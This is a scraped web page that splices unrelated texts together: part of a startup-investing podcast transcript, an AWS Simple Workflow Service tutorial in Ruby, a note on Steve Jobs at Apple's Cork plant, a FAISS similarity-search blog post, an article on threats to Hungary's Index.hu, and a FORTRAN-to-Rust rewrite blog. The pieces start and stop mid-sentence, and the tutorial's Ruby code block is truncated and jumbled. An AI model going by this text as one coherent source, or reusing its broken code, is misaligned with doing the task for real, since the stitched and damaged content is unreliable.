we go through it. You can tweet at us @upsideFM or email us Hello@upside.FM. And we’ll get to that interview with Peter right after this. Hey, listener, have you ever wanted to get a message in front of the Upside audience but weren’t sure how to sponsor the show or weren’t able to do a long term sponsorship? Well, now you can just go to upside.fm/classifieds. And let our audience know anything that’s going on in your world, whether it’s an event, an application, a special coupon or deal, or just letting them know who you are what your company does. All you have to do is go to upside.fm/classifieds. And you can place an ad on this show. That’s upside.FM/classifieds.</p><p>Peter, welcome to the show.</p><p>Peter Livingston 5:16<br> Thank you. Great to be here.</p><p>Eric Hornung 5:18<br> Peter. Great to have you on after meeting via Twitter. Gotta love that. Can you take us on a quick rocketship through your career up until you’re at unpopular ventures now?</p><p>Peter Livingston 5:30<br> Yeah, happy to. So I guess most of my background is in startups and investing in I studied engineering in college. And as I was graduating, I knew I want to kind of get the startup experience and I wanted to join as early as possible and see what that’s like. And the first thing people did a little bit of seed funding, and there was a founder the VCs help bring in a CEO and then I was the first person that hired fortunate to join this this brand new company called iRhythm that was a medical device company. Developed devices for diagnosing problems with your heart. I got really lucky. Basically, we ended up launching a few products successfully grew really fast, raised a lot of money. And I stayed with them for three years. And they grew to about 90 people in those three years from a lot of money. After I left many years later, they end up going public, about three and a half billion now I felt like within those three years, I kind of got got everything I was going to learn there. And I ended up being you know, I was right out of college, just kind of junior person within the company. Even though I was there. I really knew I wanted to do business school. So I went back to business school, wants to try to start something and ended up starting something over the summer between the two years of business school with a couple other grad students at Stanford. And at the end of summer, we ended up getting a term sheet from Kleiner Perkins. And we all thought, Hey, this is a good opportunity. Let’s go run with it. So we all dropped out of school. I lived that one CEO. And that one ended up being a complete disaster. Like, in every possible way, you know, made a ton of mistakes, lost all my investors money, fought with my co founders. It was really the hardest experience in my life. It didn’t go as smoothly as that that first one and the funny thing is, though, I have learned way more from the failed startup than I did with the successful one. You know, it wasn’t obvious at the time. But you know, as I’ve come through that and kind of digested those experiences and kind of compare them to what I hear from others, it just gives me so much more perspective and kind of gave me battlescars that I think has actually made me a much better startup person, both helper and investor. Just because I’ve had multiple experiences that went too complex and so anyway, we had to shut it down finished business school, and we’re working in venture briefly at GE ventures around the same time that as a GE ventures, I started kind of doing some tiny angel investments in friends companies, like very small like 10 K, in many cases, occasionally like 25 K or something like that. But did like 10 investments in a friend’s companies and a lot of them ended up working and you know, growing and raising more money at higher valuations. And I found I was really enjoying that. And I simultaneously discovered I hated corporate venture. I realized I don’t believe in that model. You know, there are a lot of great people at GE ventures. They’re all very smart and enjoyed working with them. But I discovered that I don’t actually believe in that model as like a legitimate part of the startup ecosystem. That is very frustrating. So so basically decided to leave that and focus on angel investing full time as an individual, and over the subsequent six years, just wanting to get out there and learn as much as I could. So did a ton of small investments. Interviewing, like, about 130, during during like five or six years, it was a mix of direct and through political Angel groups did some of them. And I was also a very early LP on AngelList. And so invested through a number of people syndicates as that was kind of starting out and feel very lucky that it went really well, like no lost money on ton of deals, but I was my big hungry terminals. I took a big position in Bitcoin, have some other good ones that are that are doing well, but it just got to the point where I kind of have more of a track record, you know, I don’t know if anyone ever actually knows what they’re doing. But at least it seemed like maybe I knew more than than the average person and Anyway, people start to ask they could invest behind me. And that’s what led to me creating this my syndicate now on AngelList. I should pause there I that’s probably a whole new chapter. Since you guys want to talk about syndication.</p><p>Jay Clouse 9:11<br> I do want to get …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In this post I’m going to explore Simple Workflow Service (SWF) available in AWS.</p>

<p>To understand what SWF is good for, we need to first understand what a workflow is. <a href="https://en.wikipedia.org/wiki/Workflow">Wikipedia defines it</a> as follows:</p>

<blockquote>
  <p>A workflow consists of an orchestrated and repeatable pattern of activity, enabled by the systematic organization of resources into processes that transform materials, provide services, or process information. It can be depicted as a sequence of operations, the work of a person or group, the work of an organization of staff, or one or more simple or complex mechanisms.</p>
</blockquote>

<p>In computer systems we care about the part about processing information. Some things that could be modeled as workflows:</p>

<ul>
  <li><strong>Deployment pipeline</strong>: We could receive some code as input and then build it in a worker machine. We can run tests in parallel in different machines. If all tests pass we can deploy the binaries to another set of machines.</li>
  <li><strong>Coordinate shipments</strong>: A user buys a product on an online store and the order is placed on a system. A human monitors this system and takes care of finding the products in a warehouse and shipping them to the correct address. When the shipment is made, the information is entered in a system. The workflow notices this information an e-mails the user the shipping details.</li>
  <li><strong>Asynchronous image processing</strong>: A system uploads files to a system for processing (let’s say, create thumbnails). A workflow uses multiple workers to execute the task. If any of the machines fails while processing a set of files, they same work can be taken over by another worker.</li>
</ul>

<!--more-->

<p>Those are some high level examples. In this post I’m going to go over one example in more detail.</p>

<h2 id="components">Components</h2>

<p>Before we start building a workflow, let’s learn a little about the components of an SWF:</p>

<ul>
  <li><strong>Workflow</strong>: A set of activities, and some logic that defines how these work together to achieve some objective</li>
  <li><strong>Domain</strong>: A workflow lives in a domain. A Domain can contain multiple workflows. Workflows in different domains can’t interact</li>
  <li><strong>Execution</strong>: An instance of the workflow with its associated state</li>
  <li><strong>Event</strong>: Represents a change on the state of an execution</li>
  <li><strong>Starter</strong>: A program, or person that starts and execution</li>
  <li><strong>Activity</strong>: A type of task that needs to be performed, such as: resizing images, running tests, etc</li>
  <li><strong>Task</strong>: An invocation of an activity</li>
  <li><strong>Worker</strong>: Program that performs tasks</li>
  <li><strong>Decider</strong>: Program that defines the logic for the workflow</li>
</ul>

<h2 id="machine-repair-workflow">Machine repair workflow</h2>

<p>To help us get familiar with SWF, we are going to create a workflow to model the process for fixing a broken machine in a fleet. It will look something like this:</p>

<p><a href="https://ncona.com/images/posts/fixing-broken-machine-workflow.png"><img src="https://ncona.com/images/posts/fixing-broken-machine-workflow.png" alt="Fixing broken machine workflow"></a></p>

<p>This workflow can be used in a datacenter that runs a lot of machines. We can have the workflow probe machines to see if they are working well. If it notices something wrong, it sets the machine state as <code>maintenance</code> in a database. If it doesn’t find anything wrong, it finishes the execution.</p>

<p>Once a machine is drained we’ll do two things. We’ll have a person take a look at the machine and fix it and we’ll take the oportunity to reimage the machine so we have clean machine when it comes back.</p>

<p>Once the repair and the reimage are done, we can set the state back to <code>available</code> and finish the execution.</p>

<h2 id="getting-ready">Getting ready</h2>

<p>For our activities and the decider, we are going to need the AWS SDK. In this section I’m going to show how to get it ready.</p>

<p>We’ll use Ruby for our examples, since it’s easy to run and it’s very well supported. The latest version of the Ruby SDK at the time of this writing is version 3. We’ll create a <code>Gemfile</code> with dependencies:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>source</span> <span>'https://rubygems.org'</span>

<span>gem</span> <span>'aws-sdk-swf'</span><span>,</span> <span>'~&gt; 1'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can then install them using:</p>



<p>The AWS SDK will need to communicate with AWS, so we’ll need some credentials, these credentials can be set in environment variables like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre><span>export </span><span>AWS_ACCESS_KEY_ID</span><span>=</span>&lt;your key <span>id</span><span>&gt;</span>
<span>export </span><span>AWS_SECRET_ACCESS_KEY</span><span>=</span>&lt;your secret&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="activities">Activities</h2>

<p>Each of the boxes in the diagram above is an <code>activity</code>. Activities can be pretty self contained, so we’ll start building those.</p>

<p>An activity works by polling the workflow for pending tasks. If it finds that there is a task it can perform, it does so, and returns a result back. Polling then continues until there is more work to do.</p>

<p>Our activities will share some code with the decider, so let’s create a base class that will be shared between them (<code>workflow_base.rb</code>):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

  <span>end</span>

  <span># Register a domain for our workflow (if it doesn't already exist)</span>

    <span>swf</span> <span>=</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Client</span><span>.</span><span>new</span><span>(</span><span>region: </span><span>region</span><span>)</span>
    <span>begin</span>
      <span>swf</span><span>.</span><span>register_domain</span><span>({</span>
        <span>name: </span><span>domain_name</span><span>,</span>
        <span>workflow_execution_retention_period_in_days: </span><span>'3'</span>
      <span>})</span>
      <span>puts</span> <span>"Domain </span><span>#{</span><span>domain_name</span><span>}</span><span> registered"</span>
    <span>rescue</span> <span>Aws</span><span>::</span><span>SWF</span><span>::</span><span>Errors</span><span>::</span><span>DomainAlreadyExistsFault</span>
      <span>puts</span> <span>"Domain </span><span>#{</span><span>domain_name</span><span>}</span><span> already exists"</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This class defines some constants that are shared between the decider and activities. It also initializes the SWF client and register the domain if it doesn’t yet exist.</p>

<p>Because of the way SWF works, it is best if the code for all our activities is handled by a single program. This program will poll for any new tasks in the domain. Every time it sees a task it will execute it and send the result back to SWF. Because each task is blocking, we could spin many copies of this program to allow tasks to be executed in parallel if we wanted to.</p>

<p>Apple founder Steve Jobs talks to reporter Pat Kenny at the company's Cork plant in 1980.</p>
<p>On 24 January 1984 the first Apple Macintosh computer went on sale.&nbsp;The Apple prided itself on its user-friendly interface, came in a nine inch black and white monitor, accommodated one 3.5 inch floppy disc, and ran the Mac OS 1.0.</p>
<p>Apple has long been synonymous with Ireland and set up a manufacturing plant in Hollyhill Industrial Estate overlooking Cork city. On 25 November 1980 the programme 'Public Account' broadcast a report by Pat Kenny from the Apple plant in Cork, when Pat met up with self-made millionaire and Apple founder Steve Jobs.</p>

<small>Steve Jobs chats to Pat Kenny at the newly opened Apple plant in Cork (1980)</small></p>
<p>Pat Kenny speaks to Steve Jobs about the origins of Apple and how they came to set up their manufacturing plant in Cork. Steve comments</p>
<blockquote>
<p>We started off building a computer because we couldn't afford to buy one.</p>
</blockquote>
<p>Then all their friends wanted one which gave them the initial market indication that there was a demand for computers. Steve differentiates Apple computers as more "sophisticated" than other computers. Steve predicts that computers will be used extensively in the home, in education and in business. When questioned about the usability of the Apple, Steve comments that the computer weighs about 12lbs, so</p>
<blockquote>
<p>if you don't like what it's doing, you can throw it out the window.</p>
</blockquote>
<p>When the Apple plant opened it was somewhat unconventional in its treatment of its workers. Apple operated a "no clock-in" policy opting instead to trust their employees.</p>
<p>This episode of the programme 'Public Account' was broadcast on 26 November, 1980.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Measuring the similarity between vectors or arrays is a calculation that we encounter often while developing recommendation systems or other machine learning models. This often involves performing similarity searches on entire datasets that can be computationally expensive. For systems that require such calculations to happen online in real-time, this can be a major issue and is something we often have to deal with at Caboom.</p><p><br>Luckily, we are not the only ones faced with this problem and there are open-source libraries like <a href="https://github.com/facebookresearch/faiss">FAISS</a> that have been developed to solve this exact problem by the Facebook AI Research team.</p><p>‍</p><p>FAISS or <strong>F</strong>acebook <strong>AI</strong> <strong>S</strong>imilarity <strong>S</strong>earch is a library written in the C++ language with GPU support. It also has Python bindings so that it can be used with Numpy, Pandas, and other Python-based libraries. Its algorithmic enhancements that vastly narrow down the search space for a vector's k-nearest neighbors allow it to have much faster similarity search between vectors as compared to existing libraries like Scikit Learn. This technique is called Approximate Nearest Neighbours (ANN) search, and sacrifices some precision to obtain the vast speedups.&nbsp;</p><p>Compared to other ANN libraries FAISS implements various vector compression, partitioning, and indexing techniques, especially by making use of the parallelism enabled by GPUs to make similarity search lookups more efficient. We will mostly be focusing on its indexing features and how that leads to fast similarity search in recommender systems. There are several other methods and optimizations in FAISS which can’t be covered by this blog alone. For a detailed overview of how its internal mechanism works, different&nbsp; and the previous work it builds upon please refer <a href="https://github.com/facebookresearch/faiss/wiki">here</a>.</p><p>To show the speed gains obtained from using FAISS, we did a comparison of bulk cosine similarity calculation between the FlatL2 and IVFFlat indexes in FAISS and the brute-force similarity search used by one of the most popular Python machine learning frameworks Scikit-learn.&nbsp;</p><p>A dataset of 20k movies was used for this comparison, with the similarity search performed on vectors obtained from the various genres of the movie.The task was to select the top 10 most similar movies for each of the 20k movies from a candidate pool ranging from 0 to 1000 movies. </p><p>‍</p><figure id="w-node-0ec5b7e06d99-2fefdd35"><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0c174333f77039795e2d8a_Screen%20Shot%202020-07-13%20at%2013.56.15.png" alt="Speed comparison between two FAISS indexes"></p></figure><figure id="w-node-cf497c7d8071-2fefdd35"><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0c17886b4272e3e7bd2790_Screen%20Shot%202020-07-13%20at%2013.56.35.png" alt=""></p></figure><p>As seen from the plots above, the time taken to perform the similarity search increases linearly for Scikit-learn to a few seconds, while that for the Flat index based search is an order of magnitude faster.&nbsp;</p><h2>Basic Indexes</h2><p>As stated above the main strength of FAISS is the speed with which it can perform similarity searches on billions of vectors at the cost of some precision. This is possible because of the implementation of indexes in FAISS that the whole package is optimized for. These indexes store a set of vectors and provide search functions in these sets with various vector comparison algorithms. One good way of understanding them is to think of them like the indexes used in databases to make queries faster.&nbsp;</p><p>We will now go through an example implementation of creating a FAISS index.&nbsp;</p><h3>Flat Index</h3><p>The simplest implementation of the index in FAISS is the <strong>IndexFlatL2 index</strong>. It is an exact search index that encodes the vectors into fixed-size codes. As the name suggests it is an index that compares the L2 (euclidean) distance between vectors and returns the top-k similar vectors. During the search, all the indexed vectors are decoded sequentially, and compared to the vector whose nearest neighbors we are being calculated. This vector is also called the <strong>query vector</strong>.&nbsp;</p><p>This is different from how similarity search is done in libraries like Scikit-learn, as we have to choose the kind of similarity we are measuring and select the index accordingly. FAISS also optimizes how the index vectors are stored in memory or disk by using a tree data structure that hugely improves the search time.</p><p>The following code shows the process of defining the index vector size, initiating the IndexFlatL2 index, adding vectors to the index and saving the index into disk.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a67e212a15625c1ca46_Image1.png" alt=""></p></figure><p>‍</p><p>We can reuse the saved index later for searching a vector's nearest neighbors. The following code snippet shows how to load the index and perform nearest neighbor search on it.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a7a898b077ff2c73e44_image%202.png" alt=""></p></figure><p>‍</p><p>Output:<br>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8a87898b072b2ac73e45_image%203.png" alt=""></p></figure><p>‍</p><p>‍</p><p>The output shows the resulting indexes and distances for the first five vectors of an index. In the second “distances” matrix we can see that the vectors have their nearest neighbors at the beginning of the array row, with a distance of 0 with itself and increasing in value as we move towards the end.&nbsp;</p><p>Another thing to remember is that in this case the index of the arrays is set automatically by FAISS in increasing order like the "auto_increment" column in SQL databases. It is advisable to use either a mapper with FAISS to real indexes or use a FAISS provided index setting which will come up further along.</p><h3>Cosine Similarity Measurement</h3><p>Although calculating Euclidean distance for vector similarity search is quite common, in many cases <strong>cosine similarity</strong> is preferred. In FAISS we don't have a cosine similarity method but we do have indexes that calculate the inner or dot product between vectors. For example, the <strong>IndexFlatIP</strong> <strong>index</strong>. We can then take advantage of the fact that cosine similarity is simply the dot product between normalized vectors.&nbsp;</p><p>The code snippet below shows how this can be implemented. Partition-based Index</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8aa4dd31940e941cddbd_image%204.png" alt=""></p></figure><p>Another class of indexes in FAISS are partition-based indexes that speed up searches by partitioning the index into clusters and limiting the search to only a few clusters. This method however is not exact as there is no guarantee that the nearest neighbors will be in the clusters searched in.&nbsp;&nbsp;</p><p><br>An example of an index that uses partitioning techniques to make the search space a lot less and far more efficient is <strong>IndexIVFFlat index</strong>.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8aaf04e10128d6d54b3c_image%205.png" alt=""></p></figure><p>‍</p><p>The search operation can be carried out in the same way as earlier indexes. However, in the IVFFlat index we define the “nprobe” hyperparameter to limit the search to only the defined number of clusters nearest to the query vector. This is also an example of how different indexes can be compounded to form a single index.</p><h3>Principal Component Analysis (PCA)</h3><p>We’ve looked at the use cases for some of the basic algorithms in FAISS. This section looks at a method called PCA. It is an algorithm that is popular in unsupervised machine learning that is used to reduce the vector dimensions using <strong>Principal Components</strong> of the vector space.</p><p>In FAISS, PCA is generally followed by indexes like IndexFlatL2 or IndexIVFFlat and they are linked with the help of the <strong>IndexPreTransform</strong> function.&nbsp;One requirement of this method is that the dimension of a vector needs to be a multiple of 4.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8ab9ec95620e8410fb11_image%206.png" alt=""></p></figure><h3>Dimension Remapping</h3><p>PCA allows us to reduce the dimensions but what if we want to increase the dimensionality of the vectors? We may encounter this scenario if we want to use an IndexIVFFlat index for instance. In this case, the dimensionality should ideally be a multiple of 4. FAISS allows us to do this through the <strong>RemapDimensionTransform </strong>method.As an example, let us suppose we have a vector of size 150 that we need to use with an IndexIVFFlat index. The way we transform this to a size that is a multiple of 4 (152) is given below.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef484d478bae23cf2704aef/5f0d8ac81fd412abe2e2dab8_image%207.png" alt=""></p></figure><p>‍</p><div><p>What next?This brings us to the end of Part 1 of this discussion on using the FAISS library from Facebook. Here we looked at the speedup it provides when compared to the similar methods used in Scikit-learn, and how FAISS optimizes this through various indexes. In Part 2 we will go beyond the basic indexing methods and look at more advanced versions. We will also look at the GPU support in FAISS, and how to make the calculations even faster by leveraging them.</p><p>‍</p></div></div></div>]]>

<article>
<ul><li>Stay updated on the latest news from Hungary by signing up for the free InsightHungary newsletter:</li></ul><p>Vice President of the European Commission for Values and Transparency Věra Jourová sent a <a href="https://index.hu/kultur/media/2020/07/07/aggodik_az_index_fuggetlensegeert_az_europai_bizottsag_alelnoke/">letter</a> on July 7 to Index.hu, Hungary’s largest online news portal, expressing her solidarity with its staff which she said “has been working under very difficult conditions”.<br></p><p>Jourová wrote that while media revenues have been heavily hit by the coronavirus pandemic, “economic pressure should not turn into political pressure...I have been following the situation of Index with concern. What you are doing, the values you are fighting for, media freedom and pluralism, are essential for democracy.”</p><p>The letter came amid what Index considered a fight for its existence. In late June, an urgent <a href="https://index.hu/english/2020/06/21/independence_of_index_in_danger_hungary_press_freedom_media/">public statement</a> signed by around 100 editors and journalists raised the alarm that the site's independence had come under attack, and that the outlet was in "grave danger".&nbsp;</p><p>To many observers of Hungary's media environment, the news came as little surprise. It was widely considered only a matter of time before the outlet faced attacks on its editorial independence, an expectation engendered by years of other Hungarian websites, newspapers, television networks and radio stations being shuttered or suddenly transformed under political and financial pressure.</p><p>This year, media watchdog Reporters Without Borders, which has described the level of media control in Hungary as "unprecedented" in the European Union, <a href="https://rsf.org/en/hungary">ranked </a>the country 89th in the world for media freedom, down 33 places from when the organization began its rankings in 2013. Additionally, the U.S.-based non governmental organization <a href="https://freedomhouse.org/country/hungary/freedom-world/2020">Freedom House</a> gave Hungary a score of two out of four for media freedom and plurality this year.</p><p>Despite this media environment and a perpetual struggle to preserve its independence, Index has, somewhat paradoxically, managed to remain the <a href="https://reutersinstitute.politics.ox.ac.uk/sites/default/files/2020-06/DNR_2020_FINAL.pdf">most-read and one of the most trusted news sources in Hungary</a>&nbsp;for the past 20 years. It has maintained its critical reporting even as government-tied businesspeople were embedded in its ownership structure, and has walked a tightrope between its journalistic principles and a deep uncertainty over when, and how, they might be curtailed.</p><p>This constant vulnerability, and the ways Index’s newsroom has successfully struggled to retain its independence while so many other Hungarian outlets could not, are illustrative of the broader mechanisms that have undermined media plurality and freedom in Hungary for the past decade.</p><h2>“Index Is In Danger”</h2><p>Two years ago, staff at the outlet established an <a href="https://szabadindex.eu/">online independence barometer</a>, a means of directly addressing readers on the status of Index's editorial independence. The barometer was set up after a government-tied figure purchased a stake in the company that controls Index’s revenue stream, and was emblematic of the perceived inevitability of an attack on the site. At the time, a <a href="https://index.hu/english/2018/09/18/index_independence_press_freedom/">letter to readers</a> said that staff felt they were “stuck on the frontline of a world war. Sometimes it’s the Red Army, sometimes it’s the Wehrmacht that marches over us.”<br></p><p>For the two years since its inception, the barometer read “Independent”. But on June 21, for the first time, staff moved the dial to "In Danger".</p><figure><a rel="nofollow" href="https://4cdn.hu/kraken/image/upload/s--axVjxGbd--/7T9PtAkyhooMBj7ps.jpeg"></a><figcaption><svg xmlns="http://www.w3.org/2000/svg" version="1.1" preserveAspectRatio="xMidYMid">

</svg><span>Index's "independence barometer"</span><span>Fotó: index.hu</span></figcaption></figure><p>The change came after a series of board meetings of Index’s parent foundation, where a recommendation was made by an outside advisor to break up the site and outsource its content creation to external, newly-formed companies.<br></p><p>The proposal, ostensibly a response to economic pressure caused by the coronavirus pandemic, alarmed several members of the board of directors, including editor-in-chief Szabolcs Dull and CEO András Pusztay. In a <a href="https://index.hu/english/2020/06/21/independence_of_index_in_danger_hungary_press_freedom_media/">statement</a>, Dull wrote that Index was “under such external pressure that could spell out the end of our editorial staff as we know it. We are concerned that with the proposed organisational overhaul, we will lose those values that made Index.hu the biggest and most-read news site in Hungary.”<br></p><p>When news of the proposal leaked in the media, Dull was suspended from the board of directors. A few days later, Pusztay resigned as CEO, saying he could not in good conscience carry out the orders which had been placed on him. Since then, the newly-appointed CEO <a href="https://index.hu/kultur/media/2020/06/30/lemondott_az_index_vezerigazgatoja_zodi_zsolt/">resigned</a> after less than a week on the job, and another <a href="https://index.hu/english/2020/07/07/index_indamedia_hungary_press_freedom_editor_in_chief_advisor/">external advisor</a> has <a href="https://444.hu/2020/07/07/az-indamedia-tanacsadoja-az-index-foszerkesztojenek-levaltasat-surgeti">recommended Dull’s removal</a> as editor-in-chief.</p><p>These disruptive events and proposals by government-tied advisors alarmed Dull, Pusztay and many staff members on their own merits, but the circumstances’ similarities to earlier takeovers of critical media outlets likely added fuel to their suspicions. The events at Index, and some of the actors involved, fit a pattern going back years that illustrates a cohesive strategy for building a media environment that can be managed from the highest levels of political power.</p><h2>The Usual Suspects</h2><p>In March, an influential figure in pro-government media enterprises purchased a 50 percent stake in Indamedia, the company which controls all of Index's revenue streams and has exclusive rights to manage its advertising. The arrival of Miklós Vaszily in Index’s innermost circumference caused new concerns that government-tied figures were closing in on the outlet, evoking alarming memories of an earlier event involving Vaszily that sent shockwaves through the Hungarian media market.</p><p>In 2014, Vaszily oversaw the <a href="https://444.hu/2014/06/05/deutsche-telekom-hungarian-government-collude-to-silence-independent-media">dramatic takeover</a> of Hungary’s then-largest online news outlet Origo, where he served as CEO. Origo’s reporting on cases of corruption within the government, especially concerning two high-level ministers from the governing Fidesz party, reportedly angered party officials and led to political pressure being placed on the outlet’s parent company.&nbsp;</p><p>Vaszily is widely thought to have acted on the government’s behalf to facilitate changes at Origo that resulted in the <a href="https://444.hu/2014/06/02/varatlanul-kirugtak-az-origo-foszerkesztojet/">dismissal of the site’s editor-in-chief</a> and the <a href="https://444.hu/2014/06/04/petho-andras-a-lazar-utazasairol-szolo-cikk-szerzoje-felmond-az-origonal/">resignation</a> of more than 30 journalists over what they considered a pro-government shift in editorial direction. Once a producer of quality investigative journalism and reportage, Origo is now considered by many to be a government mouthpiece.</p><figure><a rel="nofollow" href="https://4cdn.hu/kraken/image/upload/s--RGLOgiES--/6rMVTtlrB1zC1F5pJs.jpeg"></a><figcaption><svg xmlns="http://www.w3.org/2000/svg" version="1.1" preserveAspectRatio="xMidYMid">

</svg><span>Miklós Vaszily (center), the joint owner of Indamedia.</span><span>Fotó: Koszticsák Szilárd</span></figcaption></figure><p>Following the takeover of Origo, Vaszily quickly rose through the ranks of government-tied media. He was appointed CEO of Hungary's public broadcasting organization MTVA (itself deeply loyal to the Fidesz-led government), and later became the CEO of Echo TV and the chairman of TV2, both owned by Lőrinc Mészáros, an oligarch and personal childhood friend of Prime Minister Viktor Orbán. According to <a href="https://tldr.444.hu/2020/07/02/csendben-fojtana-meg-az-indexet-a-kormany-de-a-szerkesztoseg-nem-hagyja-magat">reporting by 444’s Pál Dániel Rényi</a>, Vaszily is known to have connections with the highest levels of government, and meets personally with Mr. Orbán to discuss important issues.<br></p><p>His important role in the government-tied media landscape and involvement in the Origo affair made Vaszily’s entrance in the ownership structure of Index seem to portend a future for the outlet which could echo Origo’s fate.&nbsp;</p><p>Origo’s 180-degree turn serves as a template for how government loyalists have repurposed critical media in the service of political interests. Often, rather than hostile legislation or direct intervention being used to transform an outlet, changes in ownership and financial pressure have been applied to indirectly shift outlets’ editorial direction, insulating the government from direct involvement. Financial "reforms" are thus used to justify takeovers under the banner of simple commercial efficiency.&nbsp;</p><p>These same arguments are now being used to account for changes at Index: Vaszily has <a href="https://tldr.444.hu/2020/07/02/csendben-fojtana-meg-az-indexet-a-kormany-de-a-szerkesztoseg-nem-hagyja-magat">denied</a> he intends to muzzle the outlet, but insists economic problems must be addressed – despite the site’s position as the leader on the Hungarian media market.&nbsp;</p><p>Undermining media independence using financial “reforms” is a model that has been frequently used since 2010, although more aggressive methods including outright closure have also been employed. In 2016, Hungary's most-read daily newspaper Népszabadság was <a href="https://www.nytimes.com/2016/10/12/world/europe/hungary-newspaper-nepszabadsag.html">suddenly shut down</a> following the acquisition of the paper’s publisher by an Austrian businessman with ties to Fidesz. Staff arrived one morning to find they had been locked out of the building, and could access neither their company email accounts nor the paper’s website. The closure, which staff described as a “coup”, made international headlines and resulted in a wave of <a href="https://www.theguardian.com/world/2016/oct/09/protests-in-hungary-at-closure-of-main-leftwing-opposition-newspaper">street protests</a> for media freedom, but the paper’s publisher insisted the decision was purely economic, and that the paper had been struggling financially.</p><figure><a rel="nofollow" href="https://4cdn.hu/kraken/image/upload/s--MT582P6T--/6vATDH0v0K1lghSTs.jpeg"></a><figcaption><svg xmlns="http://www.w3.org/2000/svg" version="1.1" preserveAspectRatio="xMidYMid">

</svg><span>A protester holds a copy of Népszabadság at a protest against the paper's closure.</span><span>Fotó: Zoltan Tuba.www.tubazoltan.com</span></figcaption></figure><p>Another means for seizing control of the media has been the generous use of <a href="https://www.tandfonline.com/doi/full/10.1080/21599165.2019.1662398?fbclid=IwAR0dDqMkZUlLipK1vS_QqWTEN1qm99Iupb4qde-vj1IW4BVx8kW9vv1LLDE&amp;">government advertising</a> in friendly publications and the withholding of ads in critical ones, heavily distorting the media market and putting financial pressure on independent outlets. Nearly 90 percent of ad revenues in the Fidesz-tied newspaper Magyar Idők came from <a href="https://www.tandfonline.com/doi/full/10.1080/21599165.2019.1662398#F0002">ads paid for by the government</a> in 2017, compared with 3 percent in the conservative Magyar Nemzet (which was government-critical at the time but has since been recaptured). According to editor-in-chief Dull, Index receives practically none of its ad revenue from the government.<br></p><p>Such methods for media control, which have now become commonplace, first began with Fidesz’s entrance to power in 2010, and represented a dramatic interruption of some 20 years of relative balance and development in Hungary’s media market following the collapse of socialism in 1990.</p><h2>Paradise Lost</h2><p>At the time of Index’s founding in the late 1990s, Hungary was entering a period of hopeful optimism following a decade of uncertainty and economic decay that came after what Hungarians call “the system change”, the country’s democratic transition after 1989. The internet was just taking off in the country, and for many, Index was symbolic …</p></article></div></div>

There were secondary goals such as improving the testing infrastructure, setting up CI/CD, estimating progress and allowing the computation to be paused and resumed.</p><p>Forewarning: I have essentially zero domain knowledge in this project (and fluid dynamics simulation isn’t exactly the kind of topic you can catch up to research level on over a weekend) so I approached this project from a purely software engineering perspective. As for my Rust experience, I’ve been using it for personal projects since ~2016 and I worked as a Rust software engineer at a startup in Berlin for a year after leaving high school.</p><h2 id="dont-rewrite">Don’t Rewrite</h2><p><a href="https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/">Don’t.</a></p><p><a href="https://understandlegacycode.com/blog/avoid-rewriting-a-legacy-system-from-scratch-by-strangling-it/">Rewrite.</a></p><p><a href="https://medium.com/better-programming/how-i-failed-to-deal-with-legacy-code-8e123cff5bce">Legacy.</a></p><p><a href="https://daedtech.com/the-myth-of-the-software-rewrite/">Code.</a></p><p>Not too hard a concept to grasp, is it? Not much ambiguity and a clear line of reasoning to follow as to why legacy software should not be rewritten. Well I read the articles written by people far more experienced and knowledgable than myself and thought:</p><p><img src="https://mckeogh.tech/post/shallow-water/0e1.png" alt="https://knowyourmeme.com/memes/that-sign-cant-stop-me-because-i-cant-read"></p><h2 id="why-my-situation-is-different">Why <em>My</em> Situation is Different</h2><p>All jokes aside, there are situations where a re-implementation is a reasonable option and I did have several factors to back me up.</p><p>FORTRAN is undoubtably <em>very</em> fast and highly suited to HPC problems with decades-optimised compilers and debugging tooling but it does lack certain features, namely memory safety, thread safety, data race guarantees and ergonomic GPU/CLI/TUI libraries.</p><p>Having written parallel software in both C and Rust, the memory safety guarantees and easy parallelisation with Rayon offered by Rust contrasts quite sharply with my poor experience using OpenMP. Replacing <code>.iter()</code> with <code>.par_iter()</code> and having the compiler automatically throw errors for any code that isn’t thread safe is amazing compared with adding OpenMP directive sentinels (designed to be hidden from a non OpenMP-compliant FORTRAN compiler) and manually determining thread and memory safety. Here seems a good a place as any to mention that <a href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/">“~70% of the vulnerabilities Microsoft assigns a CVE each year continue to be memory safety issues”</a>.</p><p>It was believed initially that GPUs could be used to accelerate the computation, ~another place where Rust’s (while not mature) ecosystem also shines above those offered for FORTRAN~ EDIT: completely untrue, FORTRAN’s GPU acceleratin libraries are very mature and production ready. Additionally when it came to the additional requirements building a <code>ncurses</code> interface in FORTRAN isn’t exactly ergonomic compared with the libraries available in Rust. I spent some time reading through the original implementation and attempted some basic parallelisation with little success due to small errors being hard to diagnose across long executions without snapshot testing across multiple modules.</p><p>Not only was there several “pull” factors, but there was also the absence of the typical reasons you shouldn’t rewrite: I was working as a one-person team, the software was finalised and so never needed to be modified again, it was relatively small so could be rewritten in a matter of months (part time) and is not a live 